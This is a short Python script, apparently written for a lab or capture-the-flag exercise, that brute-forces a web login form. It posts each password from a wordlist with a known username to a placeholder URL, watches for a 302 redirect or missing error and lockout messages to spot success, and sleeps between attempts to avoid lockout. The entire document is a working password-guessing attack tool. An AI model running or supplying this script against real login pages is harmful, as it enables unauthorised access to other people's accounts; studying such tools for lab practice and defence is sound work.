import requests
import time

url = "URL"
username = "valid/found-username"

with open("passwords.txt") as f:
    passwords = [line.strip() for line in f if line.strip()]

print(f"[*] Testing passwords for: {username}\n")

for pwd in passwords:
    data = {"username": username, "password": pwd}
    r = requests.post(url, data=data, allow_redirects=False)

    status = r.status_code
    length = len(r.text)
    has_invalid = "Invalid username or password" in r.text
    has_lock = "too many incorrect" in r.text.lower()

    print(f"{pwd:20} | Status: {status} | Len: {length} | Invalid: {has_invalid} | Lock: {has_lock}")

    if status == 302:
        print(f"\n[+] REAL SUCCESS (302) → Password: {pwd}")
        break

    if not has_invalid and not has_lock:
        print(f"\n[+] Interesting response for: {pwd}")
        print(r.text[:400])
        break

    time.sleep(0.4)

print("\n[*] Done")
